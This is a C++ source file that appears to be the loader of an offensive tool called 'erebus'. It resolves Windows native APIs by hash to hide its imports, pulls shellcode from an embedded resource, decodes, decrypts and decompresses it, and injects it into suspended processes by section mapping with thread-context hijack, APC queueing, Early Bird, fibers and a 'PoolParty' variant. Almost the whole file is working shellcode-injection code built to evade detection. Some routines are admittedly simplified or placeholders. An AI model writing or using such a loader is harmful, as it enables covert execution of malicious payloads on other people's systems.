#include "loader.hpp"

namespace erebus {

	Config config{};

	// ============================================================
	// PEB/TEB / IMPORTS
	// ============================================================
	PTEB GetTEB(void) {
#ifdef _WIN64
		return (PTEB)__readgsqword(0x30);
#else
		return (PTEB)__readfsdword(0x18);
#endif
	}

	PPEB GetPEB(void) {
#ifdef _WIN64
		return (PPEB)__readgsqword(0x60);
#else
		return (PPEB)__readfsdword(0x30);
#endif
	}

	PPEB GetPEBFromTEB(void) {
		PTEB teb = GetTEB();
		return (teb) ? teb->ProcessEnvironmentBlock : NULL;
	}

	HMODULE GetModuleHandleC(_In_ ULONG dllHash) {
#if defined(_WIN64)
		#define ldr_offset 0x18
		#define list_offset 0x10
#elif defined(_WIN32)
		#define ldr_offset 0x0C
		#define list_offset 0x0C
#endif
		PPEB pPeb = GetPEB();
		if (!pPeb) pPeb = GetPEBFromTEB();
		if (!pPeb || !pPeb->Ldr) return NULL;

		PLIST_ENTRY head = (PLIST_ENTRY)&pPeb->Ldr->InMemoryOrderModuleList;
		PLIST_ENTRY next = head->Flink;
		if (!next) return NULL;

		while (next != head) {
			PLDR_MODULE module = (PLDR_MODULE)((PBYTE)next - list_offset);
			if (module->BaseDllName.Buffer != NULL && module->BaseDllName.Length > 0) {
				if (dllHash - erebus::HashStringFowlerNollVoVariant1a(module->BaseDllName.Buffer) == 0)
					return (HMODULE)module->BaseAddress;
			}
			next = next->Flink;
		}
		return NULL;
	}

	FARPROC GetProcAddressC(_In_ HMODULE dllBase, _In_ ULONG funcHash) {
		if (!dllBase) return NULL;
		PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(dllBase);
		if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

#if _WIN64
		PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((PBYTE)dos + (dos)->e_lfanew);
#else
		PIMAGE_NT_HEADERS32 nt = (PIMAGE_NT_HEADERS32)(dos + (dos)->e_lfanew);
#endif
		PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dos + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

		if (exports->AddressOfNames != 0) {
			PWORD ordinals = (PWORD)((UINT_PTR)dllBase + exports->AddressOfNameOrdinals);
			PDWORD names = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfNames);
			PDWORD functions = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfFunctions);

			for (DWORD i = 0; i < exports->NumberOfNames; i++) {
				LPCSTR name = (LPCSTR)((UINT_PTR)dllBase + names[i]);
				if (HashStringFowlerNollVoVariant1a(name) == funcHash) {
					return (FARPROC)((PBYTE)dllBase + functions[ordinals[i]]);
				}
			}
		}
		return NULL;
	}

	HMODULE LoadLibraryC(_In_ PCWSTR dll_name) {
		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) return NULL;
		ImportFunction(ntdll, RtlInitUnicodeString, typeRtlInitUnicodeString);
		ImportFunction(ntdll, LdrLoadDll, typeLdrLoadDll);
		if (!RtlInitUnicodeString || !LdrLoadDll) return NULL;
		UNICODE_STRING unicode_module = { 0 };
		HANDLE module_handle = INVALID_HANDLE_VALUE;
		ULONG flags = 0;
		RtlInitUnicodeString(&unicode_module, dll_name);
		NTSTATUS status = LdrLoadDll(NULL, &flags, &unicode_module, &module_handle);
		if (!NT_SUCCESS(status)) return NULL;
		return (HMODULE)module_handle;
	}

	VOID RtlFreeHeapC(_In_ HANDLE HeapHandle, _In_ ULONG Flags, _In_ PVOID HeapBase) {
		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) return;
		ImportFunction(ntdll, RtlFreeHeap, typeRtlFreeHeap);
		if (!RtlFreeHeap) return;
		RtlFreeHeap(HeapHandle, Flags, HeapBase);
	}
	

	VOID CleanupModule(_In_ HMODULE module_handle) { return; }

	// ============================================================
	// DECOMPRESSION & DECODING ROUTINES
	// ============================================================

	VOID DecompressionLZNT(_Inout_ BYTE** Input, _Inout_ SIZE_T* InputLen)
	{
		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) return;
		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
		ImportFunction(ntdll, RtlFreeHeap, typeRtlFreeHeap);
		ImportFunction(ntdll, RtlDecompressBuffer, typeRtlDecompressBuffer);
		if (!RtlDecompressBuffer || !RtlFreeHeap || !RtlAllocateHeap) return;

		SIZE_T OutputLen = (*InputLen) * 4;
		BYTE* Output = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, OutputLen);
		if (!Output) return;

		ULONG FinalOutputSize;
		if (NT_SUCCESS(RtlDecompressBuffer(0x0002, Output, (ULONG)OutputLen, *Input, (ULONG)*InputLen, &FinalOutputSize))) {
			// Only free if it was heap allocated (Main ensures this by copying first)
			RtlFreeHeap(RtlProcessHeap(), 0, *Input);
			*Input = Output;
			*InputLen = FinalOutputSize;
		} else {
			RtlFreeHeap(RtlProcessHeap(), 0, Output);
		}
	}

	VOID DecompressionRLE(_Inout_ BYTE** Input, _Inout_ SIZE_T* InputLen)
	{
		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) return;
		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
		ImportFunction(ntdll, RtlFreeHeap, typeRtlFreeHeap);

		if (!Input || !*Input || !InputLen || *InputLen == 0)
		{
			LOG_ERROR("Invalid input buffer for RLE decompression");
			return;
		}

		SIZE_T OutputCapacity = (*InputLen) * 4;
		if (OutputCapacity < *InputLen)
		{
			LOG_ERROR("Output length overflow in RLE decompression");
			return;
		}

		BYTE* Output = (BYTE*)RtlAllocateHeap(RtlProcessHeap(), 0, OutputCapacity);
		if (!Output)
		{
			LOG_ERROR("Failed to allocate RLE output buffer");
			return;
		}
		SIZE_T OutputIndex = 0;

		for (SIZE_T i = 0; i < *InputLen && OutputIndex < OutputCapacity; i++)
		{
			BYTE byte = (*Input)[i];

			// Check if this is a run byte (0xFF indicates a run)
			if (byte == 0xFF && i + 1 < *InputLen)
			{
				i++;
				BYTE count = (*Input)[i];
				if (i + 1 < *InputLen)
				{
					i++;
					BYTE value = (*Input)[i];
					for (int j = 0; j < count && OutputIndex < OutputCapacity; j++)
					{
						Output[OutputIndex++] = value;
					}
				}
			}
			else
			{
				Output[OutputIndex++] = byte;
			}
		}

		BYTE* OldInput = *Input;
		*Input = Output;
		*InputLen = OutputIndex;
		RtlFreeHeap(RtlProcessHeap(), 0, OldInput);
		return;
	}

	// Calculate entropy using integer-based heuristic (CRT-less alternative)
	// Returns approximate entropy score without floating point math
	// Score: 0-100+ where high scores indicate encryption/compression
	DWORD CalculateEntropyInteger(_In_ const BYTE* Data, IN SIZE_T DataLen)
	{
		if (!Data || DataLen == 0) return 0;

		DWORD frequency[256] = { 0 };
		for (SIZE_T i = 0; i < DataLen; i++)
			frequency[Data[i]]++;

		// Count how many byte values appear
		DWORD uniqueBytes = 0;
		for (int i = 0; i < 256; i++)
		{
			if (frequency[i] > 0)
				uniqueBytes++;
		}

		// Simple entropy approximation:
		// - Uniform distribution (all 256 bytes appear) = high entropy (encrypted/compressed)
		// - Low diversity = low entropy (plaintext)
		// Score: (uniqueBytes / 256) * 100
		return (uniqueBytes * 100) / 256;
	}

	BYTE DecodeBASE64Char(CHAR c)
	{
		if (c >= 'A' && c <= 'Z') return c - 'A';
		if (c >= 'a' && c <= 'z') return c - 'a' + 26;
		if (c >= '0' && c <= '9') return c - '0' + 52;
		if (c == '+') return 62;
		if (c == '/') return 63;
		return 0;
	}

	BOOL DecodeBase64(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
	{
		SIZE_T OutputCapacity = (InputLen / 4) * 3 + 3;
		BYTE* DecodedData = new BYTE[OutputCapacity];
		SIZE_T DecodedLen = 0;
		SIZE_T PaddingCount = 0;

		if (Input[InputLen - 1] == '=') PaddingCount++;
		if (Input[InputLen - 2] == '=') PaddingCount++;

		for (SIZE_T i = 0; i < InputLen; i += 4)
		{
			BYTE b1 = DecodeBASE64Char(Input[i]);
			BYTE b2 = DecodeBASE64Char(Input[i + 1]);
			BYTE b3 = (i + 2 < InputLen && Input[i + 2] != '=') ? DecodeBASE64Char(Input[i + 2]) : 0;
			BYTE b4 = (i + 3 < InputLen && Input[i + 3] != '=') ? DecodeBASE64Char(Input[i + 3]) : 0;

			DecodedData[DecodedLen++] = (b1 << 2) | (b2 >> 4);

			if (i + 2 < InputLen && Input[i + 2] != '=')
				DecodedData[DecodedLen++] = ((b2 & 0x0F) << 4) | (b3 >> 2);

			if (i + 3 < InputLen && Input[i + 3] != '=')
				DecodedData[DecodedLen++] = ((b3 & 0x03) << 6) | b4;
		}

		DecodedLen -= PaddingCount;
		*Output = DecodedData;
		*OutputLen = DecodedLen;
		return TRUE;
	}

	BOOL DecodeASCII85(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
	{
		SIZE_T OutputCapacity = (InputLen / 5) * 4 + 4;
		BYTE* DecodedData = new BYTE[OutputCapacity];
		SIZE_T DecodedLen = 0;

		for (SIZE_T i = 0; i < InputLen; i += 5)
		{
			if (i + 4 >= InputLen) break;

			DWORD value = 0;
			for (int j = 0; j < 5; j++)
			{
				CHAR c = Input[i + j];
				if (c < 33 || c > 117)
					continue;
				value = value * 85 + (c - 33);
			}

			DecodedData[DecodedLen++] = (BYTE)((value >> 24) & 0xFF);
			DecodedData[DecodedLen++] = (BYTE)((value >> 16) & 0xFF);
			DecodedData[DecodedLen++] = (BYTE)((value >> 8) & 0xFF);
			DecodedData[DecodedLen++] = (BYTE)(value & 0xFF);
		}

		*Output = DecodedData;
		*OutputLen = DecodedLen;
		return TRUE;
	}

	BOOL DecodeALPHA32(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
	{
		const CHAR Alpha32Alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";
		SIZE_T OutputCapacity = InputLen;
		BYTE* DecodedData = new BYTE[OutputCapacity];
		SIZE_T DecodedLen = 0;

		for (SIZE_T i = 0; i < InputLen; i++)
		{
			for (int j = 0; j < 64; j++)
			{
				if (Input[i] == Alpha32Alphabet[j])
				{
					DecodedData[DecodedLen++] = (BYTE)j;
					break;
				}
			}
		}

		*Output = DecodedData;
		*OutputLen = DecodedLen;
		return TRUE;
	}

	BOOL DecodeWORDS256(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
	{
		// WORDS256 encoding uses a 256-word dictionary - each word is replaced with its index
		// This is a placeholder implementation; adjust based on your specific word dictionary
		SIZE_T OutputCapacity = InputLen * 2;
		BYTE* DecodedData = new BYTE[OutputCapacity];
		SIZE_T DecodedLen = 0;

		const CHAR* WordDelimiters = " \t\n\r";
		SIZE_T i = 0;

		while (i < InputLen && DecodedLen < OutputCapacity)
		{
			// Skip delimiters
			while (i < InputLen && strchr(WordDelimiters, Input[i]))
				i++;

			if (i >= InputLen) break;

			// Extract word index
			SIZE_T WordStart = i;
			while (i < InputLen && !strchr(WordDelimiters, Input[i]))
				i++;

			SIZE_T WordLen = i - WordStart;
			DWORD WordIndex = 0;

			// Convert word to index (assumes numeric word index)
			for (SIZE_T j = 0; j < WordLen && j < 3; j++)
			{
				WordIndex = WordIndex * 10 + (Input[WordStart + j] - '0');
			}

			if (WordIndex <= 255)
			{
				DecodedData[DecodedLen++] = (BYTE)WordIndex;
			}
		}

		*Output = DecodedData;
		*OutputLen = DecodedLen;
		return TRUE;
	}

	// ===========================================================
	// DECRYPTION ROUTINE
	// ===========================================================

	// XOR Decryption
	VOID DecryptionXor(unsigned char* data, size_t len, unsigned char* key, size_t key_len)
	{
		if (key_len == 0) return;
		for (size_t i = 0; i < len; i++) {
			data[i] ^= key[i % key_len];
		}
	}

	// RC4 Decryption
	VOID DecryptionRc4(unsigned char* data, size_t len, unsigned char* key, size_t key_len)
	{
		unsigned char S[256];
		unsigned char temp;
		int i, j = 0;
		
		for (i = 0; i < 256; i++) S[i] = i;
		
		for (i = 0; i < 256; i++) {
			j = (j + S[i] + key[i % key_len]) % 256;
			temp = S[i];
			S[i] = S[j];
			S[j] = temp;
		}
		
		i = 0; j = 0;
		for (size_t k = 0; k < len; k++) {
			i = (i + 1) % 256;
			j = (j + S[i]) % 256;
			temp = S[i];
			S[i] = S[j];
			S[j] = temp;
			data[k] ^= S[(S[i] + S[j]) % 256];
		}
	}

	// ============================================================
	// AUTO-DETECTION LOGIC
	// ============================================================

	VOID AutoDetectAndDecode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen)
	{
		LOG_INFO("Decompressing shellcode...");

		switch (CONFIG_COMPRESSION_TYPE)
		{
			case FORMAT_LZNT1:
			{
				LOG_SUCCESS("Decompressing with LZNT1");
				DecompressionLZNT(Shellcode, ShellcodeLen);
				break;
			}
			case FORMAT_RLE:
			{
				LOG_SUCCESS("Decompressing with RLE");
				DecompressionRLE(Shellcode, ShellcodeLen);
				break;
			}
			default:
				LOG_INFO("No compression configured (CONFIG_COMPRESSION_TYPE = 0), skipping decompression");
				break;
		}
	}

	VOID AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen)
	{
		LOG_INFO("Decoding shellcode...");

		switch (CONFIG_ENCODING_TYPE)
		{
		case FORMAT_BASE64:
		{
			LOG_SUCCESS("Decoding Base64");
			DecodeBase64(Input, InputLen, Output, OutputLen);
			break;
		}
		case FORMAT_ASCII85:
		{
			LOG_SUCCESS("Decoding ASCII85");
			DecodeASCII85(Input, InputLen, Output, OutputLen);
			break;
		}
		case FORMAT_ALPHA32:
		{
			LOG_SUCCESS("Decoding ALPHA32");
			DecodeALPHA32(Input, InputLen, Output, OutputLen);
			break;
		}
		case FORMAT_WORDS256:
		{
			LOG_SUCCESS("Decoding WORDS256");
			DecodeWORDS256(Input, InputLen, Output, OutputLen);
			break;
		}
		default:
		{
			LOG_INFO("No encoding configured (CONFIG_ENCODING_TYPE = 0), returning raw input");
			*Output = new BYTE[InputLen];
			RtlCopyMemory(*Output, Input, InputLen);
			*OutputLen = InputLen;
			break;
		}
		}
	}

	// ============================================================
	// DECOMPRESSION ROUTINE
	// ============================================================
	
	VOID DecompressShellcode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen)
	{
		LOG_INFO("========================================");
		LOG_INFO("Shellcode Decompression (CONFIG-based)");
		LOG_INFO("========================================");

		switch (CONFIG_COMPRESSION_TYPE)
		{
		case FORMAT_LZNT1:
		{
			LOG_SUCCESS("Decompressing with LZNT1");
			DecompressionLZNT(Shellcode, ShellcodeLen);
			LOG_SUCCESS("Decompression complete: %zu bytes", *ShellcodeLen);
			break;
		}
		case FORMAT_RLE:
		{
			LOG_SUCCESS("Decompressing with RLE");
			DecompressionRLE(Shellcode, ShellcodeLen);
			LOG_SUCCESS("Decompression complete: %zu bytes", *ShellcodeLen);
			break;
		}
		default:
			LOG_INFO("No compression configured (CONFIG_COMPRESSION_TYPE = 0)");
			break;
		}

		// Final validation
		LOG_INFO("========================================");
		LOG_INFO("Decompression complete");
		LOG_INFO("Final size: %zu bytes", *ShellcodeLen);

		DWORD finalEntropyScore = CalculateEntropyInteger(*Shellcode, *ShellcodeLen);
		LOG_INFO("Final entropy score: %lu/100", finalEntropyScore);

		if (*ShellcodeLen > 0 && (*Shellcode)[0] != 0x00)
		{
			LOG_SUCCESS("Shellcode appears valid (non-null start)");
		}
		else
		{
			LOG_ERROR("Shellcode may be invalid or corrupted");
		}

		LOG_INFO("========================================");
	}

	// ============================================================
	// RESOURCE STAGING
	// ============================================================
	BOOL StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PBYTE* shellcode, OUT SIZE_T* shellcode_size)
	{
		BOOL success = FALSE;
		HRSRC resource_handle = FindResourceW(nullptr, MAKEINTRESOURCEW(resource_id), resource_class);
		if (!resource_handle) {
			// LOG_ERROR("Failed to get resource handle.");
			return success;
		}

		DWORD resource_size = SizeofResource(nullptr, resource_handle);
		HGLOBAL global_handle = LoadResource(nullptr, resource_handle);
		if (!global_handle) {
			// LOG_ERROR("Failed to get global handle.");
			return success;
		}

		PVOID resource_pointer = LockResource(global_handle);
		if (!resource_pointer) {
			// LOG_ERROR("Failed to get resource pointer.");
			return success;
		}

		// Allocate new buffer on heap so it's writable (important for decryption!)
		*shellcode = (PBYTE)HeapAlloc(GetProcessHeap(), 0, resource_size);
		if (*shellcode) {
			RtlCopyMemory(*shellcode, resource_pointer, resource_size);
			*shellcode_size = (SIZE_T)resource_size;
			success = TRUE;
		}

		return success;
	}

	// ============================================================
	// MEMORY WRITER
	// ============================================================
	PVOID WriteShellcodeInMemory(IN HANDLE process_handle, IN BYTE* shellcode, IN SIZE_T shellcode_size)
	{
		BYTE* pFinalShellcode = shellcode;
		SIZE_T sFinalSize = shellcode_size;

		// 1. Decompress/Decode
		erebus::AutoDetectAndDecode(&pFinalShellcode, &sFinalSize);

		SIZE_T bytes_written = 0;
		PVOID base_address = NULL;
		SIZE_T allocation_size = sFinalSize;
		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) return NULL;

		ImportFunction(ntdll, NtAllocateVirtualMemory, typeNtAllocateVirtualMemory);
		ImportFunction(ntdll, NtWriteVirtualMemory, typeNtWriteVirtualMemory);
		ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);

		if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory) return NULL;

		if (NT_SUCCESS(NtAllocateVirtualMemory(process_handle, &base_address, 0, &allocation_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE))) {
			if (NT_SUCCESS(NtWriteVirtualMemory(process_handle, base_address, (PVOID)pFinalShellcode, sFinalSize, &bytes_written))) {
				DWORD old;
				NtProtectVirtualMemory(process_handle, &base_address, &allocation_size, PAGE_EXECUTE_READ, &old);
				return base_address;
			}
		}
		return NULL;
	}

	BOOL CreateProcessSuspended(IN wchar_t cmd[], OUT HANDLE* process_handle, OUT HANDLE* thread_handle)
	{
		STARTUPINFOW startup_info = {};
		PROCESS_INFORMATION process_info = {};
		BOOL success = CreateProcessW(NULL, cmd, NULL, NULL, FALSE, (CREATE_NO_WINDOW | CREATE_SUSPENDED), NULL, NULL, &startup_info, &process_info);
		*process_handle = process_info.hProcess;
		*thread_handle = process_info.hThread;
		return success;
	}

	// ============================================================
	// INJECTION METHODS
	// ============================================================

	VOID InjectionNtMapViewOfSection(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle)
	{
		BYTE* pFinalShellcode = shellcode;
		SIZE_T sFinalSize = shellcode_size;

		erebus::AutoDetectAndDecode(&pFinalShellcode, &sFinalSize);

		HANDLE section_handle;
		LARGE_INTEGER section_size = { 0 };
		section_size.QuadPart = sFinalSize;

		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) return;

		ImportFunction(ntdll, NtCreateSection, typeNtCreateSection);
		ImportFunction(ntdll, NtMapViewOfSection, typeNtMapViewOfSection);
		ImportFunction(ntdll, NtUnmapViewOfSection, typeNtUnmapViewOfSection);
		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
		ImportFunction(ntdll, NtClose, typeNtClose);

		if (!NtCreateSection || !NtMapViewOfSection || !NtClose || !NtUnmapViewOfSection || !NtResumeThread) return;

		if (NT_SUCCESS(NtCreateSection(&section_handle, SECTION_ALL_ACCESS, NULL, &section_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL))) {
			PVOID local_addr = NULL;
			SIZE_T view_size = sFinalSize;
			if (NT_SUCCESS(NtMapViewOfSection(section_handle, NtCurrentProcess(), &local_addr, 0, 0, 0, &view_size, ViewShare, 0, PAGE_READWRITE))) {
				RtlCopyMemory(local_addr, pFinalShellcode, sFinalSize);
				
				PVOID remote_addr = NULL;
				if (NT_SUCCESS(NtMapViewOfSection(section_handle, process_handle, &remote_addr, 0, 0, 0, &view_size, ViewShare, 0, PAGE_EXECUTE_READ))) {
					LPCONTEXT ctx = new CONTEXT();
					ctx->ContextFlags = CONTEXT_FULL;
					if (GetThreadContext(thread_handle, ctx)) {
#ifdef _WIN64
						ctx->Rip = (DWORD64)remote_addr;
#else
						ctx->Eip = (DWORD)remote_addr;
#endif
						SetThreadContext(thread_handle, ctx);
						NtResumeThread(thread_handle, NULL);
					}
					delete ctx;
				}
				NtUnmapViewOfSection(NtCurrentProcess(), local_addr);
			}
			NtClose(section_handle);
		}
		NtClose(process_handle);
		NtClose(thread_handle);
	}

	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		// WriteShellcodeInMemory calls AutoDetect internally now
		PVOID base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		
		if (base_address) {
			HMODULE ntdll = ImportModule("ntdll.dll");
			if (ntdll) {
				ImportFunction(ntdll, NtQueueApcThread, typeNtQueueApcThread);
				ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
				ImportFunction(ntdll, NtClose, typeNtClose);

				if (NtQueueApcThread && NtResumeThread && NtClose) {
					NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
					NtResumeThread(hThread, NULL);
					NtClose(hThread);
					NtClose(hProcess);
				}
			}
		}
	}

	VOID InjectionCreateFiber(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. CreateFiber");

		PVOID base_address = NULL;

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) {
			LOG_ERROR("Failed to write shellcode to memory region");
			return;
		}

		// Convert current thread to fiber
		LPVOID main_fiber = ConvertThreadToFiber(NULL);
		if (main_fiber == NULL) {
			LOG_ERROR("Failed to convert thread to fiber (Code: 0x%08lX)", GetLastError());
			return;
		}

		LOG_SUCCESS("Converted thread to fiber");

		// Create a new fiber pointing to shellcode
		LPVOID shellcode_fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)base_address, NULL);
		if (shellcode_fiber == NULL) {
			LOG_ERROR("Failed to create fiber (Code: 0x%08lX)", GetLastError());
			ConvertFiberToThread();
			return;
		}

		LOG_SUCCESS("Created shellcode fiber at: 0x%p", shellcode_fiber);

		// Switch to shellcode fiber - execution happens here
		LOG_INFO("Switching to shellcode fiber...");
		SwitchToFiber(shellcode_fiber);

		// Control returns here after shellcode completes
		LOG_SUCCESS("Shellcode fiber execution completed");

		// Give shellcode time to complete any async operations
		Sleep(500);

		// Clean up the shellcode fiber
		if (shellcode_fiber != NULL && shellcode_fiber != main_fiber)
		{
			DeleteFiber(shellcode_fiber);
			LOG_SUCCESS("Shellcode fiber deleted");
		}

		// Convert fiber back to thread
		if (main_fiber != NULL)
		{
			ConvertFiberToThread();
			LOG_SUCCESS("Converted fiber back to thread");
		}

		LOG_SUCCESS("Injection Complete!");

		return;
	}

	VOID InjectionEarlyCascade(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. EarlyCascade (Early Bird APC)");

		PVOID base_address = NULL;

		HMODULE ntdll = ImportModule("ntdll.dll");
		ImportFunction(ntdll, NtQueueApcThread, typeNtQueueApcThread);
		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
		ImportFunction(ntdll, NtClose, typeNtClose);

		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) {
			LOG_ERROR("Failed to write shellcode to memory region");
			return;
		}

		// Queue APC to suspended thread (Early Bird technique)
		NTSTATUS status = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to queue APC (NTSTATUS: 0x%08X)", status);
			return;
		}

		LOG_SUCCESS("APC queued to suspended thread");

		// Resume thread to execute APC
		status = NtResumeThread(hThread, NULL);
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to resume thread (NTSTATUS: 0x%08X)", status);
			return;
		}

		LOG_SUCCESS("Thread resumed, shellcode executing before process initialization");

		NtClose(hThread);
		NtClose(hProcess);

		LOG_SUCCESS("Injection Complete!");

		return;
	}

	VOID InjectionPoolParty(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
	{
		LOG_INFO("Injection via. PoolParty (TP_WORK hijacking)");

		PVOID base_address = NULL;

		HMODULE ntdll = ImportModule("ntdll.dll");
		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
		ImportFunction(ntdll, NtClose, typeNtClose);
		ImportFunction(ntdll, NtQueueApcThread, typeNtQueueApcThread);
		ImportFunction(ntdll, NtAllocateVirtualMemory, typeNtAllocateVirtualMemory);
		ImportFunction(ntdll, NtWriteVirtualMemory, typeNtWriteVirtualMemory);
		ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);

		// Write shellcode to target process
		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
		if (base_address == NULL) {
			LOG_ERROR("Failed to write shellcode to memory region");
			return;
		}

		LOG_SUCCESS("Shellcode written at: 0x%08pX", base_address);

		// PoolParty technique using thread pool work items
		// We'll use the simpler APC-based approach to the suspended thread's thread pool
		
		// Allocate a TP_WORK structure in the target process
		// The TP_WORK structure contains function pointers we can hijack
		SIZE_T tp_work_size = 0x200; // Size of TP_WORK structure
		PVOID remote_tp_work = NULL;
		
		NTSTATUS status = NtAllocateVirtualMemory(
			hProcess,
			&remote_tp_work,
			0,
			&tp_work_size,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_READWRITE
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to allocate TP_WORK structure (NTSTATUS: 0x%08X)", status);
			return;
		}

		LOG_SUCCESS("Allocated TP_WORK structure at: 0x%08pX", remote_tp_work);

		// Create a fake TP_WORK structure that points to our shellcode
		// This is a simplified version - in reality, you'd need to properly construct the structure
		BYTE fake_tp_work[0x200] = { 0 };
		
		// Set the callback pointer to our shellcode (offset varies by Windows version)
		// For Windows 10/11, the callback is typically at offset 0x30
		*(PVOID*)(&fake_tp_work[0x30]) = base_address;

		// Write the fake TP_WORK structure
		SIZE_T bytes_written = 0;
		status = NtWriteVirtualMemory(
			hProcess,
			remote_tp_work,
			fake_tp_work,
			sizeof(fake_tp_work),
			&bytes_written
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to write fake TP_WORK structure (NTSTATUS: 0x%08X)", status);
			return;
		}

		LOG_SUCCESS("Fake TP_WORK structure written");

		// Instead of using worker factory, use APC to queue work to the thread pool
		// This is more reliable for remote injection
		status = NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
		
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to queue APC (NTSTATUS: 0x%08X)", status);
			return;
		}

		LOG_SUCCESS("APC queued to thread pool worker");

		// Resume the thread to execute the APC
		ULONG suspendCount = 0;
		status = NtResumeThread(hThread, &suspendCount);
		
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to resume thread (NTSTATUS: 0x%08X)", status);
		}
		else {
			LOG_SUCCESS("Thread resumed (previous suspend count: %lu)", suspendCount);
		}

		// Give time for execution
		Sleep(2000);

		// Cleanup
		if (hThread != NULL && hThread != INVALID_HANDLE_VALUE) {
			NtClose(hThread);
		}
		
		if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE) {
			NtClose(hProcess);
		}

		LOG_SUCCESS("Injection Complete!");
		return;
	}

} // End of erebus namespace
